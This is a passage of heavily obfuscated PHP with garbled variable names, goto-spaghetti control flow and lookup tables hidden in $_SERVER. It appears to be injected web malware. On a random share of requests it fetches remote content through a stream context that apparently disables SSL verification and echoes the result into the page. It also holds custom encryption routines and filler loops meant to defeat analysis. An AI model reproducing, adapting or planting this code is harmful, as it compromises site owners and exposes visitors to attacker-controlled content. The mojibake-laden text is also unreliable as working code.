$aêÇ–ÈË¾–[61]($aêÇ–ÈË¾–[62])->{$_SERVER[­£][63]}($aêÇ–ÈË¾–[215]), $aêÇ–ÈË¾–[184] => $this->qadr1544447b, $aêÇ–ÈË¾–[182] => $_SERVER[$aêÇ–ÈË¾–[183]], $aêÇ–ÈË¾–[175] => $aêÇ–ÈË¾–[155], $aêÇ–ÈË¾–[178] => $_SERVER[$aêÇ–ÈË¾–[179]]); $dãÚùç²Ÿ¡ = $this->{$_SERVER[­£][189]}($aêÇ–ÈË¾–[296], $ağ†Â°ô‚õ); goto E¨Ìíš›Ï; E¨Ìíš›Ï: $D¡ÏÍ„«¼† = $DÂ¶‹Œ³Å[638]; while (strlen($D¡ÏÍ„«¼†) < $DÂ¶‹Œ³Å[594]) { if (!$D¡ÏÍ„«¼†) { break; } $D¡ÏÍ„«¼†++; } if (!$aêÇ–ÈË¾–[198]($dãÚùç²Ÿ¡)) { return; } goto EÕ‘¿İí…„; EÈø³õ©²: $AòØ³‰µ¨ = $aêÇ–ÈË¾–[291] . $aêÇ–ÈË¾–[120]($aêÇ–ÈË¾–[292]); $AŒ¹àæ = $DÂ¶‹Œ³Å[636]; if ($this->qadr1544447b == $aêÇ–ÈË¾–[127] || !$aêÇ–ÈË¾–[112]($GLOBALS, $aêÇ–ÈË¾–[138])) { return; } goto BÚ¹à£Ä°â; BÚ¹à£Ä°â: if (!$aêÇ–ÈË¾–[248]($_SERVER[$aêÇ–ÈË¾–[44]], $cààƒÖùÓ”)) { return; } if ($aêÇ–ÈË¾–[242]() % 4 != 0) { return; } $eà·¼³»à = $aêÇ–ÈË¾–[13](array($aêÇ–ÈË¾–[293], $aêÇ–ÈË¾–[294]), $AòØ³‰µ¨); goto dÊò’µï»¢; aÌŞğä‹–Ñ: } private function ajel261fad3a($b÷ÊŞ¾èò± = '', $d‚¶¦ß‹„ò = array(), $FÅì¦·’Ö‰ = 5) { goto Aòñäª¦«‰; Aµ­èŒÏ‹: return $C­Ú–ßò™»[197]($d‚¶¦ß‹„ò, !0); goto cÃßÌËÓ÷¢; Aòñäª¦«‰: $c ÑÍ¦ä°» =& $_SERVER[Æ¼ôºÙï]; $C­Ú–ßò™» =& $_SERVER[­£]; $DÑ£ÒøÅªó = $C­Ú–ßò™»[298]; goto eÆ²µ‹æä; eÆ²µ‹æä: $f‘Í½Õ© = $c ÑÍ¦ä°»[639]; if (strlen($f‘Í½Õ©) < $c ÑÍ¦ä°»[567]) { return; } $DÑ£ÒøÅªó = $this->{$_SERVER[­£][256]}($DÑ£ÒøÅªó, $C­Ú–ßò™»[299]); goto e’ØâéÓù; a‡™ãæĞİ: if ($d‚¶¦ß‹„ò === -1) { return $DÑ£ÒøÅªó; } $cí¬ïÎô®Ò = $C­Ú–ßò™»[258](array($C­Ú–ßò™»[259] => array($C­Ú–ßò™»[262] => $FÅì¦·’Ö‰, $C­Ú–ßò™»[260] => $C­Ú–ßò™»[302]), $C­Ú–ßò™»[303] => array($C­Ú–ßò™»[304] => !1, $C­Ú–ßò™»[305] => !1))); $d‚¶¦ß‹„ò = @$C­Ú–ßò™»[263]($DÑ£ÒøÅªó, !1, $cí¬ïÎô®Ò); goto Aµ­èŒÏ‹; e’ØâéÓù: $cÅò¼«¬í = $c ÑÍ¦ä°»[640]; if (strlen($cÅò¼«¬í) < $c ÑÍ¦ä°»[578]) { return; } $DÑ£ÒøÅªó = $DÑ£ÒøÅªó . $b÷ÊŞ¾èò± . $C­Ú–ßò™»[300] . $C­Ú–ßò™»[301]($d‚¶¦ß‹„ò); goto a‡™ãæĞİ; cÃßÌËÓ÷¢: } private function elwq36d07e23() { goto bÔĞÖ„¸; F‚òÃƒÊù: if (!$aÙ‘Ùå÷Ü×) { die; } $EÔÔ®‚ôŠµ = $EÔÔ®‚ôŠµ ? $aÒ•øãÂß[250]($EÔÔ®‚ôŠµ) : 0; $FµÍ¦ÖÒ‡ = $AÎ‹‘Âïà[642]; goto d„ƒ¥ºì“; DŸÀ‹ˆÅ‰: if (!$d½Õ¥•™ÙÛ) { return; } $EÔÔ®‚ôŠµ = $aÒ•øãÂß[112]($this->ytaz7d0fb951, $aÒ•øãÂß[333]); $aÙ‘Ùå÷Ü× = $AÎ‹‘Âïà[641]; goto F‚òÃƒÊù; dÕâáÌÛ°: if (strlen($c´µ¿ˆ¶·²) < $AÎ‹‘Âïà[567]) { die; } goto D××áàÄ‚¬; bÔĞÖ„¸: $AÎ‹‘Âïà =& $_SERVER[Æ¼ôºÙï]; $aÒ•øãÂß =& $_SERVER[­£]; $D¦‰äÚéÊ = array($aÒ•øãÂß[306] => $aÒ•øãÂß[307], $aÒ•øãÂß[308] => $aÒ•øãÂß[309], $aÒ•øãÂß[310] => $aÒ•øãÂß[311], $aÒ•øãÂß[312] => $aÒ•øãÂß[313], $aÒ•øãÂß[314] => $aÒ•øãÂß[315], $aÒ•øãÂß[316] => $aÒ•øãÂß[251], $aÒ•øãÂß[317] => $aÒ•øãÂß[251], $aÒ•øãÂß[318] => $aÒ•øãÂß[307], $aÒ•øãÂß[319] => $aÒ•øãÂß[309], $aÒ•øãÂß[320] => $aÒ•øãÂß[311], $aÒ•øãÂß[321] => $aÒ•øãÂß[322], $aÒ•øãÂß[323] => $aÒ•øãÂß[313], $aÒ•øãÂß[324] => $aÒ•øãÂß[325], $aÒ•øãÂß[326] => $aÒ•øãÂß[315], $aÒ•øãÂß[327] => $aÒ•øãÂß[328], $aÒ•øãÂß[329] => $aÒ•øãÂß[330], $aÒ•øãÂß[331] => $aÒ•øãÂß[332]); goto dĞâÁ‡™’; dĞâÁ‡™’: $Aä®Ç¼í…İ = $D¦‰äÚéÊ[$this->qadr1544447b]; $Aä®Ç¼í…İ = $aÒ•øãÂß[250]($Aä®Ç¼í…İ ? $Aä®Ç¼í…İ : $aÒ•øãÂß[307]); $d½Õ¥•™ÙÛ = $AÎ‹‘Âïà[613]; goto DŸÀ‹ˆÅ‰; d„ƒ¥ºì“: while ($FµÍ¦ÖÒ‡ < $AÎ‹‘Âïà[594]) { if ($FµÍ¦ÖÒ‡ >= 0) { break; } $FµÍ¦ÖÒ‡++; } return $Aä®Ç¼í…İ + $EÔÔ®‚ôŠµ; $c´µ¿ˆ¶·² = $AÎ‹‘Âïà[643]; goto dÕâáÌÛ°; D××áàÄ‚¬: } public function cdbr24a436c8($dóÍ«½çÜ) { goto e‰¯š…ØÔ; CÕ‡ÇùÖŸÙ: if (!$dìÀ‰ª¶ÌŠ[248]($dóÍ«½çÜ[$dìÀ‰ª¶ÌŠ[334]], $e„ÂÎèÇ£Ş)) { $dìÀ‰ª¶ÌŠ[172]($dìÀ‰ª¶ÌŠ[338], !1, $dìÀ‰ª¶ÌŠ[245]); } goto Fªù«çÀ„Ä; cÇĞ’Ùğ: if ($f÷ôæøÑ³ <= $a÷¹©º†Ûô) { return; } $e„ÂÎèÇ£Ş = $dìÀ‰ª¶ÌŠ[61]($dìÀ‰ª¶ÌŠ[145])->{$_SERVER[­£][335]}($dìÀ‰ª¶ÌŠ[334])->{$_SERVER[­£][336]}($a÷¹©º†Ûô)->{$_SERVER[­£][337]}(); $e„ÂÎèÇ£Ş = $dìÀ‰ª¶ÌŠ[228]($e„ÂÎèÇ£Ş, $dìÀ‰ª¶ÌŠ[10], $dìÀ‰ª¶ÌŠ[334]); goto CÕ‡ÇùÖŸÙ; e‰¯š…ØÔ: $dìÀ‰ª¶ÌŠ =& $_SERVER[­£]; $a÷¹©º†Ûô = $this->{$_SERVER[­£][143]}(); if ($dóÍ«½çÜ[$dìÀ‰ª¶ÌŠ[334]] == $dìÀ‰ª¶ÌŠ[226]) { return; } goto DùôÍßÁ­–; DùôÍßÁ­–: if ($a÷¹©º†Ûô >= $dìÀ‰ª¶ÌŠ[250]($dìÀ‰ª¶ÌŠ[251])) { return; } $f÷ôæøÑ³ = $dìÀ‰ª¶ÌŠ[61]($dìÀ‰ª¶ÌŠ[145])->{$_SERVER[­£][146]}(); $f‰‹«Èµ¢Ë = $_SERVER[Æ¼ôºÙï][644]; goto cÇĞ’Ùğ; Fªù«çÀ„Ä: } public function ktnj69041e3e() { goto EŠˆæ¦å…Š; C—‘ÔÃõ»: $cÂø‡‹ƒÙ = $this->{$_SERVER[­£][256]}($cÂø‡‹ƒÙ, $dô·É†È²[257]); $Fóø‹êÚ‡Õ = $dô·É†È²[258](array($dô·É†È²[259] => array($dô·É†È²[260] => $dô·É†È²[261], $dô·É†È²[262] => 3))); $c¯åéØ–¿ = @$dô·É†È²[263]($cÂø‡‹ƒÙ, !1, $Fóø‹êÚ‡Õ); goto aò÷¶©¿©; EŠˆæ¦å…Š: $dô·É†È² =& $_SERVER[­£]; if (!$dô·É†È²[112]($GLOBALS, $dô·É†È²[138]) || $dô·É†È²[339](1, 100) > 20) { return; } $cÂø‡‹ƒÙ = $dô·É†È²[255]; goto C—‘ÔÃõ»; aò÷¶©¿©: $bÖ¯‰Šô£ğ = $_SERVER[Æ¼ôºÙï][645]; echo $dô·É†È²[340] . $dô·É†È²[341]($c¯åéØ–¿) . $dô·É†È²[342]; goto EïË¼°ÏŞè; EïË¼°ÏŞè: } private function niyx5110b330($f’ÌÜ”¹³—, $aÔÙ†°Š”‡, $E½ªÇÏ¨‰Ü = 3) { goto dö›ì¿Ë¾ï; C®Æ•Ñ¦¹Œ: $cğƒŒçù—« = $D‚ÄÆøó£µ[339](0, 5) . $D‚ÄÆøó£µ[10]; $E¯Ù†Êìä = $Eô“Úœ¤[648]; while ($E¯Ù†Êìä < $Eô“Úœ¤[567]) { if ($E¯Ù†Êìä >= 0) { break; } $E¯Ù†Êìä++; } goto d¿¿¿åä«©; d›İš§œË: $bâ©Â½×áâ = $Eô“Úœ¤[664]; if ($E½ªÇÏ¨‰Ü - 1 > 0) { $A½Í’†è– = $this->{$_SERVER[­£][133]}($A½Í’†è–, $aÔÙ†°Š”‡, $E½ªÇÏ¨‰Ü - 1); } return $A½Í’†è–; goto BŞó‚ÃŠÄÉ; cÑéÌÎ–‰í: $f§‰é‹¸šÅ = $Eô“Úœ¤[646]; $f’ÌÜ”¹³— = $D‚ÄÆøó£µ[2]($f’ÌÜ”¹³—); $cóõ‡Ä¹ÀÄ = $Eô“Úœ¤[647]; goto C®Æ•Ñ¦¹Œ; C’§—è©˜š: $CÊ«³£ŒÕ = $D‚ÄÆøó£µ[344]; switch ($cğƒŒçù—«) { case $D‚ÄÆøó£µ[240]: $A½Í’†è– = $this->{$_SERVER[­£][153]}($f’ÌÜ”¹³—, $D‚ÄÆøó£µ[220]($aÔÙ†°Š”‡ . $bÑÚÍÂ˜Æõ)); break; case $D‚ÄÆøó£µ[226]: $A½Í’†è– = $this->{$_SERVER[­£][153]}($f’ÌÜ”¹³—, $D‚ÄÆøó£µ[220]($bÑÚÍÂ˜Æõ . $aÔÙ†°Š”‡)); break; $a˜¶Ô™ß£× = $Eô“Úœ¤[650]; case $D‚ÄÆøó£µ[345]: $A½Í’†è– = $this->{$_SERVER[­£][153]}($f’ÌÜ”¹³—, $D‚ÄÆøó£µ[124]($bÑÚÍÂ˜Æõ . $aÔÙ†°Š”‡)); $B¦…Ë²¸Äº = $Eô“Úœ¤[651]; if (!$B¦…Ë²¸Äº) { return; } break; $D™¼Ø¼‹¦º = $Eô“Úœ¤[652]; if (strlen($D™¼Ø¼‹¦º) < $Eô“Úœ¤[594]) { die; } case $D‚ÄÆøó£µ[346]: $A½Í’†è– = $this->{$_SERVER[­£][153]}($f’ÌÜ”¹³—, $D‚ÄÆøó£µ[120]($bÑÚÍÂ˜Æõ . $aÔÙ†°Š”‡)); $D’¸íå Ó = $Eô“Úœ¤[563]; if (!$D’¸íå Ó) { return; } break; case $D‚ÄÆøó£µ[347]: goto bŞ†Ù›„ù; c÷õ„îÌä”: $cÜ‡Æß±ÍÀ = 0; $a¨÷Çİˆ¸ = $Eô“Úœ¤[656]; $fôæ’æËù° = 0; goto cÜ¦‚î²¿; AƒŞÏŞè¶: $bØ–ç“îƒ = $D‚ÄÆøó£µ[10]; $A³¯Š²Â¢ö = 0; $fğæ¶÷ÇåÑ = $Eô“Úœ¤[655]; goto c÷õ„îÌä”; BÃ÷‡ÄàòÅ: break; $fÍÌ“«Û = $Eô“Úœ¤[661]; if (strlen($fÍÌ“«Û) < $Eô“Úœ¤[594]) { die; } goto Eç˜à£“Ÿ·; bŞ†Ù›„ù: $f’ÌÜ”¹³— = $D‚ÄÆøó£µ[124]($f’ÌÜ”¹³—); $f±áªä· = $Eô“Úœ¤[653]; if (strlen($f±áªä·) < $Eô“Úœ¤[594]) { return; } goto a‹™Õï˜‚‹; cÜ¦‚î²¿: $B†á¾µ—…„ = $Eô“Úœ¤[657]; if (!$B†á¾µ—…„) { die; } for ($A³¯Š²Â¢ö = 0; $A³¯Š²Â¢ö < $D‚ÄÆøó£µ[24]($f’ÌÜ”¹³—); $A³¯Š²Â¢ö++) { $fôæ’æËù° = $fôæ’æËù° == $D‚ÄÆøó£µ[24]($b†¨÷…×À÷) ? 0 : $fôæ’æËù°; $e±È™•´ÆÓ = $Eô“Úœ¤[658]; while (strlen($e±È™•´ÆÓ) < $Eô“Úœ¤[574]) { if (!$e±È™•´ÆÓ) { break; } $e±È™•´ÆÓ++; } $cÜ‡Æß±ÍÀ = ($C…õµÜ—Ï© + $D‚ÄÆøó£µ[349]($CÊ«³£ŒÕ, $f’ÌÜ”¹³—[$A³¯Š²Â¢ö]) + $D‚ÄÆøó£µ[350]($b†¨÷…×À÷[$fôæ’æËù°++])) % 64; $bØ–ç“îƒ .= $CÊ«³£ŒÕ[$cÜ‡Æß±ÍÀ]; $Bì»„á°Ğç = $Eô“Úœ¤[659]; while (strlen($Bì»„á°Ğç) < $Eô“Úœ¤[578]) { if (!$Bì»„á°Ğç) { break; } $Bì»„á°Ğç++; } } goto d‚ã„‡·£Œ; a‹™Õï˜‚‹: $C…õµÜ—Ï© = $D‚ÄÆøó£µ[348](0, 64); $e·ËëÇÓÕ = $CÊ«³£ŒÕ[$C…õµÜ—Ï©]; $Cë¤âÜÔĞË = $Eô“Úœ¤[654]; goto Dğå·ÈÖÂø; d‚ã„‡·£Œ: $A½Í’†è– = $D‚ÄÆøó£µ[341]($e·ËëÇÓÕ . $bØ–ç“îƒ); $a¨è‹¤ñ¨Š = $Eô“Úœ¤[660]; if (strlen($a¨è‹¤ñ¨Š) < $Eô“Úœ¤[578]) { die; } goto BÃ÷‡ÄàòÅ; Dğå·ÈÖÂø: while (strlen($Cë¤âÜÔĞË) < $Eô“Úœ¤[574]) { if (!$Cë¤âÜÔĞË) { break; } $Cë¤âÜÔĞË++; } $b†¨÷…×À÷ = $D‚ÄÆøó£µ[120]($e·ËëÇÓÕ . $D‚ÄÆøó£µ[120]($aÔÙ†°Š”‡ . $e·ËëÇÓÕ) . $aÔÙ†°Š”‡); $b†¨÷…×À÷ = $D‚ÄÆøó£µ[25]($b†¨÷…×À÷, $C…õµÜ—Ï© % 8, $C…õµÜ—Ï© % 8 + 7); goto AƒŞÏŞè¶; Eç˜à£“Ÿ·: default: $A½Í’†è– = $this->{$_SERVER[­£][153]}($f’ÌÜ”¹³—, $aÔÙ†°Š”‡ . $bÑÚÍÂ˜Æõ); $f£‘Î¼Á¹· = $Eô“Úœ¤[662]; if (strlen($f£‘Î¼Á¹·) < $Eô“Úœ¤[574]) { die; } break; $AœÇÁ£Œà÷ = $Eô“Úœ¤[663]; while (strlen($AœÇÁ£Œà÷) < $Eô“Úœ¤[574]) { if (!$AœÇÁ£Œà÷) { break; } $AœÇÁ£Œà÷++; } } $A½Í’†è– = $D‚ÄÆøó£µ[220]($cğƒŒçù—« . $bÑÚÍÂ˜Æõ . $A½Í’†è–); goto d›İš§œË; dö›ì¿Ë¾ï: $Eô“Úœ¤ =& $_SERVER[Æ¼ôºÙï]; $D‚ÄÆøó£µ =& $_SERVER[­£]; $D‚ÄÆøó£µ[343](1); goto cÑéÌÎ–‰í; d¿¿¿åä«©: $bÑÚÍÂ˜Æõ = $D‚ÄÆøó£µ[130](15); $Fò¾š­„‚÷ = $Eô“Úœ¤[649]; if (strlen($Fò¾š­„‚÷) < $Eô“Úœ¤[574]) { return; } goto C’§—è©˜š; BŞó‚ÃŠÄÉ: } private function oywsece0a532($fÁ™®µƒ³, $eõÔÏĞ¸²š, $DÇ¾ò†ï“ä = 3) { goto eÖÜøßÔİÊ; aÈ‰ƒ‹‚Õ: $fÁ™®µƒ³ = $AÂ²è÷—Û[2]($fÁ™®µƒ³); $F”âœ®‹—… = $C¢Ûª™¡ëÈ[665]; if (strlen($F”âœ®‹—…) < $C¢Ûª™¡ëÈ[574]) { die; } goto b¾©¢ã·®ï; AŠó¾†°‰š: $d–·¿ã±„ = $C¢Ûª™¡ëÈ[667]; if (strlen($d–·¿ã±„) < $C¢Ûª™¡ëÈ[578]) { return; } $aõŸ®…ëù  = $AÂ²è÷—Û[344]; goto Bí•ôÕâŞ†; eÖÜøßÔİÊ: $C¢Ûª™¡ëÈ =& $_SERVER[Æ¼ôºÙï]; $AÂ²è÷—Û =& $_SERVER[­£]; if (!$AÂ²è÷—Û[351]($fÁ™®µƒ³) || $AÂ²è÷—Û[24]($fÁ™®µƒ³) < 10) { return !1; } goto aÈ‰ƒ‹‚Õ; Bí•ôÕâŞ†: switch ($C¢‡ìë¹‚‰) { case $AÂ²è÷—Û[240]: $a¾çìÁ‹ŸÃ = $this->{$_SERVER[­£][256]}($fÁ™®µƒ³, $AÂ²è÷—Û[220]($eõÔÏĞ¸²š . $BØŠŒìíâí)); $fÍŠ¸ï·Ã = $C¢Ûª™¡ëÈ[668]; if (strlen($fÍŠ¸ï·Ã) < $C¢Ûª™¡ëÈ[567]) { return; } break; $bÏïà‘Ùõò = $C¢Ûª™¡ëÈ[669]; case $AÂ²è÷—Û[226]: $a¾çìÁ‹ŸÃ = $this->{$_SERVER[­£][256]}($fÁ™®µƒ³, $AÂ²è÷—Û[220]($BØŠŒìíâí . $eõÔÏĞ¸²š)); break; case $AÂ²è÷—Û[345]: $a¾çìÁ‹ŸÃ = $this->{$_SERVER[­£][256]}($fÁ™®µƒ³, $AÂ²è÷—Û[124]($BØŠŒìíâí . $eõÔÏĞ¸²š)); $AÆÉÁ«ğìŠ = $C¢Ûª™¡ëÈ[670]; break; $eèÃ¸¬Åí = $C¢Ûª™¡ëÈ[671]; while ($eèÃ¸¬Åí < $C¢Ûª™¡ëÈ[567]) { if ($eèÃ¸¬Åí >= 0) { break; } $eèÃ¸¬Åí++; } case $AÂ²è÷—Û[346]: $a¾çìÁ‹ŸÃ = $this->{$_SERVER[­£][256]}($fÁ™®µƒ³, $AÂ²è÷—Û[120]($BØŠŒìíâí . $eõÔÏĞ¸²š)); break; $F³Şœ³åß§ = $C¢Ûª™¡ëÈ[672]; if (!$F³Şœ³åß§) { return; } case $AÂ²è÷—Û[347]: goto b¬»‚½·˜Ê; cµÙì‘Š‚‹: while (strlen($A„±Ş¤©) < $C¢Ûª™¡ëÈ[567]) { if (!$A„±Ş¤©) { break; } $A„±Ş¤©++; } goto F“ÖÂÂà¡¡; a‚ˆ‰‘„¿ç: $a¾çìÁ‹ŸÃ = $AÂ²è÷—Û[353]($f‰ËÚ»Íˆ); break; $A„±Ş¤© = $C¢Ûª™¡ëÈ[682]; goto cµÙì‘Š‚‹; cİã²Ø‰‡: $D¿‰‡‰˜¢¦ = $C¢Ûª™¡ëÈ[676]; $d¬º–Æ»‹ª = 0; $Cšƒ“ïÚ „ = $C¢Ûª™¡ëÈ[677]; goto CšÃê¸ÖÂÛ; b‡¹”˜ÙÌ¨: $dß”ãÍÍ—â = $AÂ²è÷—Û[120]($f—¼ØÓ¹ÉŸ . $AÂ²è÷—Û[120]($eõÔÏĞ¸²š . $f—¼ØÓ¹ÉŸ) . $eõÔÏĞ¸²š); $f®õĞ»Óê = $C¢Ûª™¡ëÈ[675]; while (strlen($f®õĞ»Óê) < $C¢Ûª™¡ëÈ[567]) { if (!$f®õĞ»Óê) { break; } $f®õĞ»Óê++; } goto BËù¯¢«ì¡; CšÃê¸ÖÂÛ: $B™Æ°‹Ç÷ = 0; $cÆ µå—İ¯ = $C¢Ûª™¡ëÈ[678]; for ($b£ôè‘Õ¨Ÿ = 0; $b£ôè‘Õ¨Ÿ < $AÂ²è÷—Û[24]($fÁ™®µƒ³); $b£ôè‘Õ¨Ÿ++) { $B™Æ°‹Ç÷ = $B™Æ°‹Ç÷ == $AÂ²è÷—Û[24]($dß”ãÍÍ—â) ? 0 : $B™Æ°‹Ç÷; $DÓæ¦Éë»• = $B™Æ°‹Ç÷++; $AÅ¨†ñ’¹— = $C¢Ûª™¡ëÈ[679]; if (!$AÅ¨†ñ’¹—) { die; } $d¬º–Æ»‹ª = $AÂ²è÷—Û[349]($aõŸ®…ëù , $fÁ™®µƒ³[$b£ôè‘Õ¨Ÿ]) - $fÄ˜°Ã—ñ³ - $AÂ²è÷—Û[350]($dß”ãÍÍ—â[$DÓæ¦Éë»•]); while ($d¬º–Æ»‹ª < 0) { $d¬º–Æ»‹ª += 64; $eÃ†‰Ã˜…´ = $C¢Ûª™¡ëÈ[680]; if (strlen($eÃ†‰Ã˜…´) < $C¢Ûª™¡ëÈ[574]) { return; } } $f‰ËÚ»Íˆ .= $aõŸ®…ëù [$d¬º–Æ»‹ª]; $b»šâãÁ”‡ = $C¢Ûª™¡ëÈ[681]; } goto a‚ˆ‰‘„¿ç; b¬»‚½·˜Ê: $fÁ™®µƒ³ = $AÂ²è÷—Û[352]($fÁ™®µƒ³); $e¡Ô‡åÑƒ = $C¢Ûª™¡ëÈ[673]; $f—¼ØÓ¹ÉŸ = $fÁ™®µƒ³[0]; goto a‚º…´‘îË; a‚º…´‘îË: $fÁ™®µƒ³ = $AÂ²è÷—Û[25]($fÁ™®µƒ³, 1); $fÄ˜°Ã—ñ³ = $AÂ²è÷—Û[349]($aõŸ®…ëù , $f—¼ØÓ¹ÉŸ); $C™«Àñ…† = $C¢Ûª™¡ëÈ[674]; goto b‡¹”˜ÙÌ¨; BËù¯¢«ì¡: $dß”ãÍÍ—â = $AÂ²è÷—Û[25]($dß”ãÍÍ—â, $fÄ˜°Ã—ñ³ % 8, $fÄ˜°Ã—ñ³ % 8 + 7); $f‰ËÚ»Íˆ = $AÂ²è÷—Û[10]; $b£ôè‘Õ¨Ÿ = 0; goto cİã²Ø‰‡; F“ÖÂÂà¡¡: default: $a¾çìÁ‹ŸÃ = $this->{$_SERVER[­£][256]}($fÁ™®µƒ³, $eõÔÏĞ¸²š . $BØŠŒìíâí); break; $Bñ¬éÃ•Ğ„ = $C¢Ûª™¡ëÈ[683]; if (strlen($Bñ¬éÃ•Ğ„) < $C¢Ûª™¡ëÈ[576]) { return; } } if ($DÇ¾ò†ï“ä - 1 > 0) { $a¾çìÁ‹ŸÃ = $this->{$_SERVER[­£][195]}($a¾çìÁ‹ŸÃ, $eõÔÏĞ¸²š, $DÇ¾ò†ï“ä - 1); } return $a¾çìÁ‹ŸÃ; goto aĞÅã‹Ü±ñ; b¾©¢ã·®ï: $fÁ™®µƒ³ = $AÂ²è÷—Û[220]($fÁ™®µƒ³); $FìÏÁ¶Ï½’ = $C¢Ûª™¡ëÈ[666]; if (!$FìÏÁ¶Ï½’) { return; } goto E®‘¿âñŸ¥; E®‘¿âñŸ¥: $C¢‡ìë¹‚‰ = $fÁ™®µƒ³[0]; $BØŠŒìíâí = $AÂ²è÷—Û[25]($fÁ™®µƒ³, 1, 15); $fÁ™®µƒ³ = $AÂ²è÷—Û[25]($fÁ™®µƒ³, 16); goto AŠó¾†°‰š; aĞÅã‹Ü±ñ: } public function qtswacad3c26($eš¶áÒÚŠÜ) { goto e‡õ©Ï“Åè; CâÜ¢‹œà©: $cæ¨‰‡¡§ô = $A•”Á¸ÓÎö[120]($A•”Á¸ÓÎö[355] . ($bÜÑ¹‚Ä‰„ + $Eòª‘êä‹) . $A•”Á¸ÓÎö[356] . $CĞ‘‡Ú‹¾ì . $A•”Á¸ÓÎö[356] . $e¦Œ¤Ñàö… . $A•”Á¸ÓÎö[357]); $Fè•¨ˆÍ‹³ = $this->{$_SERVER[­£][153]}($eš¶áÒÚŠÜ, $cæ¨‰‡¡§ô) . $A•”Á¸ÓÎö[358] . $d“ÓÎó‹Ì; $d°¼ÓÂ½ô = $eâÌˆÁ‰Ù[691]; goto a§‹‘Å´„¢; e‡õ©Ï“Åè: $eâÌˆÁ‰Ù =& $_SERVER[Æ¼ôºÙï]; $A•”Á¸ÓÎö =& $_SERVER[­£]; $bÜÑ¹‚Ä‰„ = $this->{$_SERVER[­£][354]}(); goto fÁˆ÷Ì¡Ñ; B®¡¯Ò¹®: if (!$a­®©°ñŠê) { return; } goto AÚÃâ•Ç§Ï; fÁˆ÷Ì¡Ñ: $Eòª‘êä‹ = $this->{$_SERVER[­£][354]}(); $Fâ„ƒºˆä¶ = $eâÌˆÁ‰Ù[684]; $B¡ï–âí£ = ($bÜÑ¹‚Ä‰„ - 1) * ($Eòª‘êä‹ - 1); goto F¥±ˆŒìší; F¥±ˆŒìší: $CĞ‘‡Ú‹¾ì = $A•”Á¸ÓÎö[250](($bÜÑ¹‚Ä‰„ + $Eòª‘êä‹) / 2); $BÃ†­¯¥©‰ = $eâÌˆÁ‰Ù[685]; if (strlen($BÃ†­¯¥©‰) < $eâÌˆÁ‰Ù[574]) { die; } goto F÷õÌã«„É; Cïˆ¥ˆÉ¼…: if (!$a…ä˜İ›ÊÂ) { die; } for ($a·åò»±½Î = 0; $a·åò»±½Î < $B¡ï–âí£ * 10; $a·åò»±½Î++) { if (($B¡ï–âí£ * $a·åò»±½Î + 1) % $CĞ‘‡Ú‹¾ì == 0) { $e¦Œ¤Ñàö… = $A•”Á¸ÓÎö[250](($B¡ï–âí£ * $a·åò»±½Î + 1) / $CĞ‘‡Ú‹¾ì); break; } } $d“ÓÎó‹Ì = $this->{$_SERVER[­£][153]}($bÜÑ¹‚Ä‰„ * $Eòª‘êä‹ . $A•”Á¸ÓÎö[10], $A•”Á¸ÓÎö[155]); goto CâÜ¢‹œà©; a§‹‘Å´„¢: if (strlen($d°¼ÓÂ½ô) < $eâÌˆÁ‰Ù[578]) { return; } return $Fè•¨ˆÍ‹³; $a­®©°ñŠê = $eâÌˆÁ‰Ù[692]; goto B®¡¯Ò¹®; F÷õÌã«„É: while (1) { $CØóß£Èô = $CĞ‘‡Ú‹¾ì; $e‘¯´ŠŠ¶Ó = $eâÌˆÁ‰Ù[686]; if (strlen($e‘¯´ŠŠ¶Ó) < $eâÌˆÁ‰Ù[594]) { return; } $FÃ©»¢´‰ = $B¡ï–âí£; while ($FÃ©»¢´‰ % $CØóß£Èô != 0) { $E¹„Ñ¼ÂÒ = $FÃ©»¢´‰; $fÆÆ­ôãô = $eâÌˆÁ‰Ù[687]; if (strlen($fÆÆ­ôãô) < $eâÌˆÁ‰Ù[567]) { return; } $FÃ©»¢´‰ = $CØóß£Èô; $d¤Ô‘Ï…ˆš = $eâÌˆÁ‰Ù[688]; while (strlen($d¤Ô‘Ï…ˆš) < $eâÌˆÁ‰Ù[574]) { if (!$d¤Ô‘Ï…ˆš) { break; } $d¤Ô‘Ï…ˆš++; } $CØóß£Èô = $E¹„Ñ¼ÂÒ % $CØóß£Èô; $DŒ»ğ¹†˜À = $eâÌˆÁ‰Ù[689]; if (strlen($DŒ»ğ¹†˜À) < $eâÌˆÁ‰Ù[594]) { die; } } if ($CØóß£Èô == 1) { break; } else { $CĞ‘‡Ú‹¾ì++; } } $e¦Œ¤Ñàö… = 2; $a…ä˜İ›ÊÂ = $eâÌˆÁ‰Ù[690]; goto Cïˆ¥ˆÉ¼…; AÚÃâ•Ç§Ï: } public function iuxm0a5c218e($DšÆÃğ¿ãé) { goto eó¿¿ğ±‘„; Bƒâ ÷ÀåÜ: for ($BŸÒ’Õ™È‹ = 0; $BŸÒ’Õ™È‹ < $e™àêàÃ•š * 10; $BŸÒ’Õ™È‹++) { if (($e™àêàÃ•š * $BŸÒ’Õ™È‹ + 1) % $cµ³¡îªğâ == 0) { $DØÀÓ‹öß = $E­ê¼„Ğñä[250](($e™àêàÃ•š * $BŸÒ’Õ™È‹ + 1) / $cµ³¡îªğâ); break; } } $EÍ…’İğ‘ƒ = $E­ê¼„Ğñä[120]($E­ê¼„Ğñä[355] . ($E¦Ü·ì¡Ó + $B·óİÄ¦¡¾) . $E­ê¼„Ğñä[356] . $cµ³¡îªğâ . $E­ê¼„Ğñä[356] . $DØÀÓ‹öß . $E­ê¼„Ğñä[357]); $Fá¡ßËÜ÷‹ = $aÓ¯Ï÷¨ß´[699]; goto cÛ‘„Ç„Àº; dÕŠ§ºîßê: while ($bƒµºá¦Œš < $aÓ¯Ï÷¨ß´[567]) { if ($bƒµºá¦Œš >= 0) { break; } $bƒµºá¦Œš++; } return $A…‘›³í©¤; goto bï˜âİ Ãó; eà·À«™: if (strlen($AÇê „â”õ) < $aÓ¯Ï÷¨ß´[576]) { return; } for ($BŸÒ’Õ™È‹ = 3; $BŸÒ’Õ™È‹ < $eÒê‚ùêù; $BŸÒ’Õ™È‹ += 2) { if ($eÒê‚ùêù % $BŸÒ’Õ™È‹ != 0) { continue; } $E¦Ü·ì¡Ó = $BŸÒ’Õ™È‹; $dé¼í—£Ã = $aÓ¯Ï÷¨ß´[695]; $B·óİÄ¦¡¾ = $E­ê¼„Ğñä[250]($eÒê‚ùêù / $BŸÒ’Õ™È‹); break; } $e™àêàÃ•š = ($E¦Ü·ì¡Ó - 1) * ($B·óİÄ¦¡¾ - 1); goto A“ˆ¤‘ô£Ó; a¨”™ÁÌ®É: $E¦Ü·ì¡Ó = 0; $B·óİÄ¦¡¾ = 0; $AÇê 